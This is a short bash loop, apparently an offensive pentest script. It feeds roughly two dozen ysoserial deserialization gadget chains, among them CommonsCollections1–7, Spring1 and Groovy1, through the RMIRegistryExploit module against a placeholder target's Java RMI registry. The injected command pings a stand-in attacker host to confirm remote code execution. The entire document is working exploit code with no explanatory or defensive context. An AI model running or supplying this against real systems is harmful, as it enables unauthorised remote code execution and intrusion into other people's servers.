for payload in CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 Groovy1 Jdk7u21 Hibernate1 Hibernate2 JSON1 JBossInterceptors1 JavassistWeld1 MozillaRhino1 MozillaRhino2 Spring1 Spring2 ROME Vaadin1 Click1 Clojure; do
  echo "[*] Testing $payload"
  java -cp ysoserialall.jar ysoserial.exploit.RMIRegistryExploit TARGETIP TARGETPORT "$payload" 'ping -c 1 ATTACKERIP'
done
